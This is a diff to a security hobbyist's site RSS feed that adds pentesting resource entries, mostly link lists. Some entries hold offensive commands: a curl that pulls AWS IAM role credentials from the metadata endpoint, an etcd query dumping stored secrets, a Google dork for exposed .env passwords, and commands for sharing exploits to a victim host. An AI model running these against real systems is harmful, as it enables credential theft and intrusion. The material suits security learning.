@@ -82,12 +82,59 @@ I treat people same way they treat me, most important thing in my life is to sta
     </item>
     
     <item>
+      <title>Blogs</title>
+      <link>https://d47zm3.me/resources/infosec/blogs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/blogs/</guid>
+      <description> Blogs worth reading.
+Links  https://rastamouse.me - hacking Windows  </description>
+    </item>
+    
+    <item>
+      <title>Burp Suite Proxy</title>
+      <link>https://d47zm3.me/resources/infosec/burp-suite-proxy/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/burp-suite-proxy/</guid>
+      <description> Famous tool for Web Application Security.
+Links  Burp Suite Pro Tricks &amp;amp; Tips  </description>
+    </item>
+    
+    <item>
+      <title>Cloud Security</title>
+      <link>https://d47zm3.me/resources/infosec/cloud-security/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/cloud-security/</guid>
+      <description>Grab IAM Role Keys - AWS curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ Security Audit Tools  ScoutSuite  All-In-One Wiki for Cloud Penetration Testing Source: https://www.peerlyst.com/posts/all-in-one-wiki-for-cloud-penetration-testing-nitesh-malviya
+ Links and Resources for Cloud basics
+ Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/
+ SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud
+  AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/
+ Links and Resources for AWS Pentesting
+ https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/
+ https://www.provensec.com/penetration-testing-aws-s3-bucket/
+ Rhinosecuritylabs links - https://rhinosecuritylabs.com/blog/?category=aws - check all the links.</description>
+    </item>
+    
+    <item>
       <title>Code</title>
       <link>https://d47zm3.me/resources/code/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/code/</guid>
       <description></description>
+    </item>
+    
+    <item>
+      <title>Conference Video Archives</title>
+      <link>https://d47zm3.me/resources/infosec/conference-video-archives/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/conference-video-archives/</guid>
+      <description> Great site with archived content from various conferences around the world, as well as podcasts and documents.
+Links  InfoCon  </description>
     </item>
     
     <item>
@@ -125,6 +172,15 @@ I treat people same way they treat me, most important thing in my life is to sta
       <guid>https://d47zm3.me/resources/environment/gpg/</guid>
       <description>Set up GPG on computer to encrypt data &amp;amp; sign commits etc.
 MacOS Guide ~&amp;gt; brew install gnupg pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg-agent.conf # Connects gpg-agent to the OSX keychain via the brew-installed # pinentry program from GPGtools. This is the OSX &amp;#39;magic sauce&amp;#39;, # allowing the gpg key&amp;#39;s passphrase to be stored in the login # keychain, enabling automatic key signing. pinentry-program /usr/local/bin/pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg.conf # Uncomment within config (or add this line) use-agent no-tty # This silences the &amp;#34;you need a passphrase&amp;#34; message once the passphrase handling is all set.</description>
+    </item>
+    
+    <item>
+      <title>Google Dorks</title>
+      <link>https://d47zm3.me/resources/infosec/google-dorks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/google-dorks/</guid>
+      <description> Links  500 pages PDF of dorks  Dorks  https://www.google.com/search?q=db_password+filetype%3Aenv - env files  </description>
     </item>
     
     <item>
@@ -191,6 +247,39 @@ select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them fin
     </item>
     
     <item>
+      <title>Mobile Pentesting</title>
+      <link>https://d47zm3.me/resources/infosec/mobile-pentesting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/mobile-pentesting/</guid>
+      <description> Breaking security on phones.
+Sites  Hot and fresh guide from OWASP for iOS and Android available here.
+ iOS App Security, Penetration Testing, and Development - nice blog on iOS security
+  </description>
+    </item>
+    
+    <item>
+      <title>OSINT</title>
+      <link>https://d47zm3.me/resources/infosec/osint/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/osint/</guid>
+      <description> Everything related to Open Source Intelligence.
+Search Engines  censys
+ shodan
+ greynoise
+ zoomeye
+ grayhatwarfare
+ hunter.io
+ binaryedge
+ crt.sh
+ dnsdumpster
+ onyphe.io
+ fofa.so
+  </description>
+    </item>
+    
+    <item>
       <title>PKI</title>
       <link>https://d47zm3.me/resources/devops/pki/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -210,6 +299,27 @@ A message authentication code (MAC) is a bit of data that’s used to verify whi
       <guid>https://d47zm3.me/resources/infosec/padding-oracle-attack/</guid>
       <description>Performing Padding Oracle Attack using padBuster.
 Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &amp;#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&amp;#34; 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.</description>
+    </item>
+    
+    <item>
+      <title>Passwords</title>
+      <link>https://d47zm3.me/resources/infosec/passwords/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/passwords/</guid>
+      <description> Password Search Engines  gotcha.pw
+ haveibeenpwned.com
+ vigilante.pw
+  </description>
+    </item>
+    
+    <item>
+      <title>Payloads</title>
+      <link>https://d47zm3.me/resources/infosec/payloads/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/payloads/</guid>
+      <description> Links  payload collections  </description>
     </item>
     
     <item>
@@ -234,6 +344,20 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
     </item>
     
     <item>
+      <title>Secrets Dumping</title>
+      <link>https://d47zm3.me/resources/infosec/secrets-dumping/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/secrets-dumping/</guid>
+      <description>Hunt for secret in repositories/source code/disk.
+GitHub Secret Leaks:
+ https://github.com/zricethezav/gitleaks
+ https://github.com/anshumanbh/git-all-secrets
+ https://github.com/Hell0W0rld0/Github-Hunter
+  </description>
+    </item>
+    
+    <item>
       <title>Shells</title>
       <link>https://d47zm3.me/resources/environment/shells/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -241,6 +365,16 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
       <guid>https://d47zm3.me/resources/environment/shells/</guid>
       <description>From my experience two shells that are worth notice are
  ZSH Fish  In practice though, you can achieve Fish features installing particular plugins for ZSH, and yet, ZSH will still be more compatible with Bash, while Fish introduces it&amp;rsquo;s own syntax and quirks, which may be hard to adapt after long years with Bash/ZSH. Yet, still I find it very nice as out-of-box solution. Two very well known plugin packages for ZSH are</description>
+    </item>
+    
+    <item>
+      <title>Social Engineering</title>
+      <link>https://d47zm3.me/resources/infosec/social-engineering/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/social-engineering/</guid>
+      <description> Also known as human hacking.
+Links  SE Basics  </description>
     </item>
     
     <item>
@@ -295,6 +429,17 @@ Debugging on Container OS using Docker Actually it boils down to running Docker 
     </item>
     
     <item>
+      <title>Tricks</title>
+      <link>https://d47zm3.me/resources/infosec/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/tricks/</guid>
+      <description>Everything that doesn&amp;rsquo;t fit to one category.
+rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.
+rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0.</description>
+    </item>
+    
+    <item>
       <title>VIM</title>
       <link>https://d47zm3.me/resources/environment/vim/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -313,6 +458,24 @@ Debugging on Container OS using Docker Actually it boils down to running Docker 
  automatic VPN setup on fresh instance
  Digital Ocean provisioned Ubuntu instance
   I made wrapper around well known solution to set up your own VPN instance, that allows you to quickly (5 minutes) spin new instance for your usage.</description>
+    </item>
+    
+    <item>
+      <title>WPA/WPA2 Security</title>
+      <link>https://d47zm3.me/resources/infosec/wpa-wpa-2-security/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/wpa-wpa-2-security/</guid>
+      <description> Articles  new attack using PMKID  </description>
+    </item>
+    
+    <item>
+      <title>Web Application Penetration Testing Online Courses</title>
+      <link>https://d47zm3.me/resources/infosec/wapt-online-courses/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/wapt-online-courses/</guid>
+      <description> Google Docs Sheet with lots of links  </description>
     </item>
     
     <item>
@@ -337,6 +500,24 @@ Tools  ezXSS - self hosted dashboard and server for your payloads
  bXSS - blind XSS application, had not played with it yet
   Sites  XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
  XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
+    </item>
+    
+    <item>
+      <title>XXE</title>
+      <link>https://d47zm3.me/resources/infosec/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/xxe/</guid>
+      <description> XML External Entity resources.
+Links  https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html
+ https://github.com/enjoiz/XXEinjector
+ https://github.com/staaldraad/xxeserv
+ https://github.com/BuffaloWill/oxml_xxe
+ https://github.com/GDSSecurity/xxe-recursive-download
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection
+ https://isc.sans.edu/diary/Blindly+confirming+XXE/19257
+ https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf
+  </description>
     </item>
     
   </channel>
